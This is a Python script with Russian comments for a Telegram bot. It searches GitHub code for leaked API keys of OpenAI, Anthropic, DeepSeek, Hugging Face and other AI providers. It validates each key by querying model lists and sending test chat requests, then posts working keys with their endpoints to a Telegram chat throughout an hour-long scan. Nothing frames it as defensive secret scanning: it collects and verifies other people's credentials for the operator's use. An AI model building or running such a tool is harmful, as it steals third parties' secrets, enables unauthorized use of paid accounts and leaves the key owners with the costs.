import os
import re
import sys
import time
import requests
import logging
import asyncio
import random

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Настройки времени
TOTAL_RUN_TIME = 3600  # Работать 1 час (3600 секунд)
REPORT_INTERVAL = 900  # Присылать отчет каждые 15 минут (900 секунд)

KEY_PATTERNS = [
    {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
    {"provider": "kimi",        "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "minimax",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "qwen",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
    {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
    {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
]

URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')

def fetch_targets():
    logger.info("🔎 Ищу ключи и эндпоинты на GitHub...")
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
    
    # Рандомизируем запрос и страницу, чтобы искать разные файлы
    queries = ["sk- language:Python", "sk- language:JavaScript", "sk- language:TypeScript", "hf_ language:Python"]
    query = random.choice(queries)
    page = random.randint(1, 5)
    
    try:
        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30, "page": page}, timeout=15)
        if resp.status_code == 403:
            logger.error("❌ ОШИБКА 403: Токен не подходит. Нужен Classic Token!")
            return []
        resp.raise_for_status()
        
        items = resp.json().get("items", [])
        logger.info(f"✅ Найдено файлов на странице {page}: {len(items)}")
        
        targets = []
        for item in items[:15]: # Проверяем 15 файлов за раз
            repo = item["repository"]["full_name"]
            path = item["path"]
            file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
            
            if file_resp.status_code == 200:
                text = file_resp.text
                urls = URL_REGEX.findall(text)
                valid_urls = [u for u in urls if 'github.com' not in u and 'telegram' not in u and 'w3.org' not in u]
                api_urls = [u for u in valid_urls if u.endswith('/v1') or '/v1/' in u]
                
                if not api_urls and valid_urls:
                    api_urls = valid_urls[:1]

                for p in KEY_PATTERNS:
                    for match in p["regex"].finditer(text):
                        token = match.group(0)
                        if api_urls:
                            for url in api_urls[:3]:
                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
                        else:
                            targets.append({"key": token, "endpoint": "https://chat.kxsb.org/api/v1", "provider": p["provider"]})
            time.sleep(1)
            
        # Дедупликация
        unique_targets = []
        seen = set()
        for t in targets:
            sig = f"{t['key']}_{t['endpoint']}"
            if sig not in seen:
                seen.add(sig)
                unique_targets.append(t)
                
        return unique_targets
    except Exception as e:
        logger.error(f"❌ Ошибка поиска: {e}")
        return []

def check_endpoint(api_key, endpoint):
    try:
        resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
        if resp.status_code == 200:
            return [m.get("id", "") for m in resp.json().get("data", [])]
    except:
        pass
    return []

def probe_models(api_key, endpoint, models):
    results = []
    for model in models[:5]: # Уменьшили до 5 для скорости
        payload = {"model": model, "messages": [{"role": "user", "content": "pong"}], "max_tokens": 5}
        start = time.perf_counter()
        try:
            resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=10)
            latency = round(time.perf_counter() - start, 2)
            ok = resp.status_code == 200
        except Exception:
            ok, latency = False, "?"
        results.append({"model": model, "ok": ok, "latency": latency})
    return results

def format_report(key, endpoint, models, probes):
    working = [p for p in probes if p["ok"]]
    if not working:
        return None
        
    lines = [
        "🔑 Новый ключ",
        "",
        f"🌐 API — {endpoint}",
        f"🗝 Ключ — {key}",
        "✅ Работают —"
    ]
    for p in working:
        lines.append(f"{p['model']} — {p['latency']}s (pong)")
        
    lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
    if len(models) > 5:
        lines.append(f"и ещё {len(models) - 5} за кадром")
    return "\n".join(lines)

async def long_scan_loop():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    checked_keys = set() # <-- ДОБАВИТЬ ЭТО (память для текущего часа)
    start_time = time.time()
    cycle_start_time = time.time()
    
    total_checked = 0
    total_working = 0
    cycle_working = 0
    
    logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
    
    while time.time() - start_time < TOTAL_RUN_TIME:
        # Поиск (в отдельном потоке, чтобы не блокировать бота)
        targets = await asyncio.to_thread(fetch_targets)
        total_checked += len(targets)
        
        for t in targets:
            key, endpoint = t["key"], t["endpoint"]
            
            # --- КЭШ ---
            if key in checked_keys:
                continue
            checked_keys.add(key)
            # -----------
            
            logger.info(f"Проверяю {key[:10]}... на {endpoint}")
            models = await asyncio.to_thread(check_endpoint, key, endpoint)
            if not models:
                continue
                
            probes = await asyncio.to_thread(probe_models, key, endpoint, models)
            report = format_report(key, endpoint, models, probes)
            
            if report:
                total_working += 1
                cycle_working += 1
                if CHAT_ID:
                    await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
                logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
        
        # Проверка времени для промежуточного отчета
        if time.time() - cycle_start_time >= REPORT_INTERVAL:
            summary = (
                f"⏳ **Промежуточный отчет**\n"
                f"За последние {REPORT_INTERVAL//60} минут:\n"
                f"Проверено целей: {total_checked}\n"
                f"Найдено рабочих: {cycle_working}\n\n"
                f"Бот продолжает работу..."
            )
            if CHAT_ID:
                await app.bot.send_message(chat_id=CHAT_ID, text=summary, parse_mode="Markdown")
            
            # Сброс цикла
            cycle_start_time = time.time()
            cycle_working = 0
            
        # Пауза 10 секунд перед следующим кругом
        await asyncio.sleep(10)

    # Финальный отчет
    if CHAT_ID:
        await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Скан завершен. Всего рабочих ключей: {total_working}")
    logger.info("✅ Длинная сессия завершена.")

if __name__ == "__main__":
    if not BOT_TOKEN or not GITHUB_TOKEN:
        logger.error("Нет токенов!")
        sys.exit(1)
    
    asyncio.run(long_scan_loop())
